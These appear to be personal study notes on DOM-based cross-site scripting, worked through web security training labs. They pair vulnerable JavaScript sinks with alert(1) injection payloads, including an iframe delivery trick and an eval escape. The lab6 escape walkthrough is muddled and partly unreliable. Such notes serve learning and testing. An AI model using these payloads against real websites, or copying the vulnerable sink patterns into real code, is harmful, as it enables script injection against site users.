## Exploits

1. `a" onload=alert(1)>//` || `a"><img src=1 onerror=alert(1)>`
2. `a</option></select><script>alert(1)</script>`
3. `<img src=a onerror=alert(1)>`
4. `javascript:alert(1)`
5. `<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`
6. `{{ $eval.constructor('alert(1)')() }}`
7. `\"alert()}//`
8. `<><img src=1 onerror=alert()>`

```js
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">'); 
document.write('<option selected>'+store+'</option>');
document.getElementById('searchMessage').innerHTML = query;
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
Using AngulerJS, injecting code.
eval('var searchResultsObj = ' + this.responseText); //this.responseText = '{"results":[],"searchTerm":"a"}' <-- string not JSON
let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)//custom escape that only handle first < >.
```

## Main ideas
- If the vulnerable code is executed in something like `hashchange`, `urlchange`... Any thing that should be changed in user browser, Then we can use `<iframe>` with `onload`
  and put what you want to change after it `<iframe src=http//lab.com# onload="this.src+='<img src=0 onerror=alert(1)>'" >`

---
### lab1
```js
function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">'); 
} 
var query = (new URLSearchParams(window.location.search)).get('search'); 
if(query) {
	trackSearch(query);
}
IN DOM
<img src="/resources/images/tracker.gif?searchTerms=a">
________
Exploit
a" onload=alert(1)>//    OR
a"><img src=1 onerror=alert(1)>

```

### lab2
#### Adding unexpected argument
```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
	document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
	if(stores[i] === store) {
		continue;
	}
	document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');

_______IN DOM_____
<select name="storeId">
	<option selected>a</option>
	<option>London</option>
	<option>Paris</option>
	<option>Milan</option>
</select>
_________Exploit______
a</option></select><script>alert(1)</script>
```


### lab 3
#### innerHTML
```js
function doSearchQuery(query) {
	document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	doSearchQuery(query);
}
_______________
Exploit
<img src=a onerror=alert(1)>
https://web-security-academy.net/?search=%3Cimg+src%3Da+onerror%3Dalert%281%29%3E
```

### lab4
#### Sources and sinks in third-party dependencies
#### XSS in a href attribute
If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, jQuery's `attr()` function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the `attr()` function, then it may be possible to manipulate the value sent to cause XSS. For example, here we have some JavaScript that changes an anchor element's `href` attribute using data from the URL, You can exploit this by modifying the URL so that the `location.search` source contains a malicious JavaScript URL. After the page's JavaScript applies this malicious URL to the back link's `href`, clicking on the back link will execute it.
```js
  
$(function() { 
	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath')); 
});

____IN DOM_____
https://0a2100cb03db974c80f90336004a0069.web-security-academy.net/feedback?returnPath=/post
<a id="backLink" href="/post">Back</a>

____Exploit____

returnPath=javascript:alert(1)
https://0a2100cb03db974c80f90336004a0069.web-security-academy.net/feedback?returnPath=javascript:alert(1)

```

### lab5
Another potential sink to look out for is jQuery's `$()` selector function, which can be used to inject malicious objects into the DOM.
jQuery used to be extremely popular, and a classic DOM XSS vulnerability was caused by websites using this selector in conjunction with the `location.hash` source for animations or auto-scrolling to a particular element on the page. As the `hash` is user controllable, an attacker could use this to inject an XSS vector into the `$()` selector sink. More recent versions of jQuery have patched this particular vulnerability by preventing you from injecting HTML into a selector when the input begins with a hash character (`#`). However, you may still find vulnerable code in the wild. To actually exploit this classic vulnerability, you'll need to find a way to trigger a `hashchange` event without user interaction. One of the simplest ways of doing this is to deliver your exploit via an `iframe`.

> [!tip] 
> This vuln is based on creating new DOM object using `$(h2:contains)`. But that object won't appear in  the source page. 
> But if we have something like `<img src=0 onerror=alert(1)>`, This will make the browser tries to fetch the img and if failed it will execute the code. so we try to get something like `$('section.blog-list h2:contains(<img src=0 onerror=alert(1)>)')`

> [!tip] Tip: Dynamic Changes trigger
> If the vulnareble code need to have some changes in page or url. try to use `<iframe src=abc onload="javascriptCode" >` . you can change whatever you want in `onload` using javascript.

> [!warning] 
> The vulnerablitiy of  creating DOM object using $() is **patched**, but you may incounter something running in older versions.
```js
$(window).on('hashchange', function(){ 
	var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); // $() --> this create DOM object,
	//This code search for string in one of h2 tags, then assign that h2 object in post. if we put our tag inside it will be created.
	//So, 'Contains' if it find the target it will return it, if not it will create it.
	if (post) post.get(0).scrollIntoView();
});

___Exploit___
//in my exploit server
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

### lab5
[[1. what you need|Basic Anguler XSS]]

### lab6
#### eval

> [!bug] eval
> when you see eva that is red flag, you can easily execute your code. you need only to figure how to escape.

```js
eval('var searchResultsObj = ' + this.responseText);

____________
this.response --> `{"results":[],"searchTerm":"a"}`

____Exploit___
a\"-alert(1)}//

```
- because of `this.responseText()`. we have string.
- we did `"` --`"`-> `"searchTerm":"a\""}` --> But `"` got escaped so we put `\`-- `\"`--> `{"searchTerm":"a""}` --`\"-alert()`--> `"{searchTerm":"a"-alert()"}`
  we still have additional `"` at the end which make error, so we need to end the json and comment every thing --`\"alert()}//`--> `"{searchTerm":"a"-alert()} //"}`

